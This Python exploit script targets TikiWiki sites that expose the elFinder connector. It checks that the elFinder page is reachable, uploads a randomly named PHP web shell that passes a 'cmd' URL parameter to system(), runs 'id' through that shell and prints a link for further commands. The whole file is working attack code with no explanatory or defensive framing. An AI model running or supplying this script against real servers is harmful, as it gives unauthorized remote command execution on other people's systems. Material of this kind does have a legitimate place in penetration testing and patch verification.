import requests
import random
import string
from urllib.parse import urljoin

def random_filename():
    return ''.join(random.choices(string.ascii_letters, k=10)) + ".php"

def check_elfinder(base_url):
    test_url = urljoin(base_url, 'vendor_extra/elfinder/elfinder.html')
    res = requests.get(test_url)
    if res.status_code == 200:
        print("[+] ELFinder page is accessible. Target likely vulnerable.")
        return True
    else:
        print("[-] ELFinder page not found. Target may not be vulnerable.")
        return False

def upload_php_payload(base_url, filename, php_code):
    upload_url = urljoin(base_url, 'vendor_extra/elfinder/php/connector.minimal.php')

    files = {
        'cmd': (None, 'upload'),
        'target': (None, 'l1_Lw'),  # Base64 for "/"
        'upload[]': (filename, php_code, 'application/octet-stream')
    }

    print(f"[+] Uploading {filename}...")
    res = requests.post(upload_url, files=files)
    if res.status_code == 200:
        print("[+] Upload appears successful.")
        return True
    else:
        print("[-] Upload failed.")
        return False

def trigger(base_url, filename):
    shell_url = urljoin(base_url, f'vendor_extra/elfinder/files/{filename}?cmd=id')
    print(f"[+] Running 'id' at {shell_url}")
    res = requests.get(shell_url)
    if res.status_code == 200:
        print("[+] Payload executed (response below):\n")
        print(res.text)
    else:
        print("[-] Could not trigger the payload.")

def main():
    # === Prompt for base URL ===
    base_url = input("Enter TikiWiki base URL (e.g. http://localhost:8080): ").strip()
    if not base_url.endswith('/'):
        base_url += '/'

    php_payload = "<?php system($_GET['cmd']); ?>"  # Simple web shell
    filename = random_filename()

    if not check_elfinder(base_url):
        return

    if upload_php_payload(base_url, filename, php_payload):
        trigger(base_url, filename)
        print(f"[!] Try executing a command: {base_url}vendor_extra/elfinder/files/{filename}?cmd=whoami")
    else:
        print("[-] Exploit failed during upload.")

if __name__ == "__main__":
    main()
